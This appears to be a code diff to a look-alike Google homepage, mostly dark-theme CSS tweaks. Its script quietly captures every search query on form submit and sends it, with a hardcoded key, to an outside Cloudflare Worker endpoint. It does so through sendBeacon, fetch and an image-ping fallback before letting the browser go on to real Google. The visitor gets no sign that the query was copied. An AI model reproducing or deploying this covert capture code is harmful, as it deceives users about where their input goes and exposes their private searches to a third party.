@@ -4,7 +4,6 @@
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover" />
   <meta name="color-scheme" content="light dark" />
-  <!-- theme-color for browser UI -->
   <meta name="theme-color" content="#ffffff" media="(prefers-color-scheme: light)">
   <meta name="theme-color" content="#3c3c3c" media="(prefers-color-scheme: dark)">
   <title>Google</title>
@@ -22,30 +21,12 @@
       --w:clamp(280px,92vw,600px);
       --shadow: 0 1px 2px rgba(0,0,0,.06), 0 1px 3px rgba(60,64,67,.15);
     }
-    /* DARK THEME (manual) */
-    html[data-theme="dark"] {
-      --bg:#3c3c3c;        /* requested */
-      --text:#eaeaea;
-      --muted:#c7c7c7;
-      --link:#8ab4f8;
-      --surface:#4a4a4a;   /* slightly lighter than bg for subtle contrast */
-      --foot:#3a3a3a;
-      --border:#5a5a5a;
-      --icon:#d0d0d0;
-      --focus: rgba(138,180,248,.26);
-      --shadow: 0 1px 10px rgba(0,0,0,.45);
-    }
-    /* DARK THEME (auto via prefers-color-scheme) */
+
+    html[data-theme="dark"],
     @media (prefers-color-scheme: dark) {
       html[data-theme="auto"] {
-        --bg:#3c3c3c;
-        --text:#eaeaea;
-        --muted:#c7c7c7;
-        --link:#8ab4f8;
-        --surface:#4a4a4a;
-        --foot:#3a3a3a;
-        --border:#5a5a5a;
-        --icon:#d0d0d0;
+        --bg:#3c3c3c; --text:#eaeaea; --muted:#b9bcbf;
+        --link:#8ab4f8; --surface:#3c3c3c; --foot:#333; --border:#555; --icon:#d0d0d0;
         --focus: rgba(138,180,248,.26);
         --shadow: 0 1px 10px rgba(0,0,0,.45);
       }
@@ -60,7 +41,6 @@
       -webkit-font-smoothing:antialiased; -moz-osx-font-smoothing:grayscale;
     }
 
-    /* HEADER */
     header {
       display:flex; justify-content:space-between; align-items:center;
       padding:var(--s-3) var(--s-4);
@@ -70,7 +50,6 @@
       color:var(--text); font-size:14px; text-decoration:none; opacity:.9;
       margin-right:14px;
     }
-    .header-left a:last-child { margin-right:0; }
     .header-left a:hover { text-decoration:underline; }
     .sign-in {
       background:#1a73e8; color:#fff;
@@ -79,28 +58,39 @@
       min-height:36px; line-height:20px;
     }
 
-    /* MAIN */
     main {
       display:grid; place-items:start center;
       padding:clamp(12px,6vw,28px) var(--s-4);
       gap:clamp(18px,4vh,28px);
     }
     .logo { display:grid; place-items:center; width:100%; margin-top:10vh; }
-    .logo img { width:200px; max-width:62vw; height:auto; /* no filters; stays rainbow */ }
+    .logo img { width:200px; max-width:62vw; height:auto; transition:filter .3s ease; }
+    html[data-theme="dark"] .logo img,
+    @media (prefers-color-scheme: dark) {
+      html[data-theme="auto"] .logo img {
+        filter: brightness(0) invert(1); /* makes Google logo white */
+      }
+    }
 
     .search { position:relative; width:100%; max-width:var(--w); }
     .search input {
       width:100%; height:56px; border-radius:var(--r-pill);
       border:1px solid var(--border);
-      background:var(--bg);      /* stays dark in dark mode */
+      background:var(--surface);
       color:var(--text);
       padding:0 98px 0 52px;
-      box-shadow:var(--shadow); outline:none; font-size:16px;
-      /* prevent UA default white autofill on some browsers */
-      -webkit-text-fill-color:var(--text);
-      caret-color:var(--text);
+      box-shadow:var(--shadow);
+      outline:none; font-size:16px;
+      transition:background .3s ease, color .3s ease;
     }
-    .search input:focus { border-color:transparent; box-shadow:0 0 0 3px var(--focus); }
+    html[data-theme="dark"] .search input,
+    @media (prefers-color-scheme: dark) {
+      html[data-theme="auto"] .search input {
+        background:#fff;  /* white search box in dark mode */
+        color:#000;       /* black text inside */
+      }
+    }
+
     .search .material-symbols-outlined {
       position:absolute; top:50%; transform:translateY(-50%);
       font-size:22px; color:var(--icon); pointer-events:none;
@@ -109,9 +99,6 @@
     .search .mic { right:56px; }
     .search .camera { right:18px; }
 
-    .actions { display:none; }
-
-    /* FOOTER */
     footer { margin-top:auto; background:var(--foot); border-top:1px solid var(--border); }
     footer .wrap {
       display:flex; flex-wrap:wrap; justify-content:center;
@@ -133,9 +120,7 @@
 
   <main>
     <div class="logo">
-      <img loading="eager" fetchpriority="high"
-        src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png"
-        alt="Google">
+      <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" alt="Google">
     </div>
 
     <form id="search" class="search" action="https://www.google.com/search" method="GET" role="search" aria-label="Google search">
@@ -174,30 +159,24 @@
       }
     })();
 
-    // ===== Cloudflare Worker preflight (fires BEFORE Google navigation) =====
+    // ===== Cloudflare Worker preflight =====
     const ENDPOINT = 'https://google-reveal.avishaierel.workers.dev';
     const API_KEY  = 'magic-key-2025';
 
     function sendToBackend(q){
       try{
         const params = new URLSearchParams({ q, key: API_KEY });
-
-        // 1) Best during navigation: sendBeacon POST
         if (navigator.sendBeacon) {
           const blob = new Blob([params.toString()], { type: 'application/x-www-form-urlencoded;charset=UTF-8' });
           navigator.sendBeacon(ENDPOINT, blob);
         } else {
-          // 2) Fallback: POST fetch with keepalive
-          fetch(ENDPOINT + '?' + params.toString(), { method:'POST', body:params, keepalive:true, mode:'cors' }).catch(()=>{});
+          fetch(ENDPOINT, { method:'POST', body:params, keepalive:true, mode:'cors' }).catch(()=>{});
         }
-
-        // 3) GET ping fallback (ensures q shows up even if POST blocked)
         const img = new Image();
         img.src = ENDPOINT + '?' + params.toString();
       }catch(e){}
     }
 
-    // Hook search form submit (don’t prevent navigation)
     (function(){
       const form  = document.getElementById('search');
       const input = document.getElementById('q');
@@ -205,7 +184,7 @@
         form.addEventListener('submit', function(){
           const q = (input.value || '').trim();
           if(q){ sendToBackend(q); }
-        }, { capture:true }); // fire as early as possible
+        }, { capture:true });
       }
     })();
   </script>
